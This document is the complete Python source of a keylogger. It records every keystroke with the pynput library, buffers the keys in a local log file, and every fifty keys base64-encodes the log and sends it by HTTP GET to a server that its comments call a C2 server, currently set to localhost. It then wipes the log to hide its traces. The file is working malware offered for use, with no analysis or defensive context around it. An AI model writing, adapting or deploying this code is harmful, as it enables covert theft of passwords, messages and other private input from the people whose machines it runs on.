import os
import sys
import logging
import base64
import requests
from pynput import keyboard

#GLOBAL VARIABLES
count = 0
total_input = ""
SERVER = "http://localhost:4040/data/"
log_file = "logger.log"

#FUNCTION DEFINITIONS
def on_press(key):
	save_to_file(get_mapping(key))
	if(key == keyboard.Key.esc):
		sys.exit()

def get_mapping(key):
	# The following if else switch is used to handle encoding difference between Python 2 and 3
	if(str(key)[0] == 'u') and (len(str(key)) > 1):
		return (str(key)[2])
	else:
		if(key == keyboard.Key.backspace):
			return "[BACKSPACE]"
		elif(key == keyboard.Key.shift_r or key == keyboard.Key.shift):
			return " "
		elif(key == keyboard.Key.ctrl or key == keyboard.Key.ctrl_r):
			return "[CTRL]"
		elif(key == keyboard.Key.tab):
			return "[TAB]"
		elif(key == keyboard.Key.caps_lock):
			return "[CAPS_LOCK]"
		elif(key == keyboard.Key.cmd):
			return "[CMD]"
		elif(key == keyboard.Key.alt_l or key == keyboard.Key.alt_r):
			return "[ALT]"
		elif(key == keyboard.Key.esc):
			return "[ESC]"
		elif(key == keyboard.Key.enter):
			return "[ENTER]"
		elif(key == keyboard.Key.space):
			return " "
		elif(key == keyboard.Key.up or key == keyboard.Key.down or key == keyboard.Key.right or key == keyboard.Key.left):
			return " "
		else:
			return str(key)

def record_keystrokes():
	with keyboard.Listener(on_press = on_press) as listener:
		listener.join()


def start_logger(log_file_name):
	logging.basicConfig(level=logging.INFO, filename=log_file_name, filemode='a', format='%(message)s')

# save_to_file and overwrite log use log_file variable as global variable 
def save_to_file(_input):
	global total_input
	total_input += _input
	global count
	count += 1
	if(count >= 50):
		logging.info(total_input)
		with open(log_file, "rb") as f:
			_output = f.read()
		f.close()
		send_to_c2(str(_output))
		overwrite_log()
		count = 0
		total_input = ""

def overwrite_log(): 
	#Overwrites the file after so many characters 
	with open(log_file, "w") as file:
		file.write("")
	file.close()

def send_to_c2(_output):
	try:
		encodedBytes = base64.urlsafe_b64encode(_output.encode("utf-8"))
		encodedStr = str(encodedBytes)
		payload_url = SERVER + encodedStr
		#Data is exfiled using a get request to the C2 server.  No processing is done with the response
		r = requests.get(payload_url)
	except Exception as e:
		print("Error thrown")
		pass

###########START OF MAIN CODE ##############################33

overwrite_log()
start_logger(log_file)
record_keystrokes()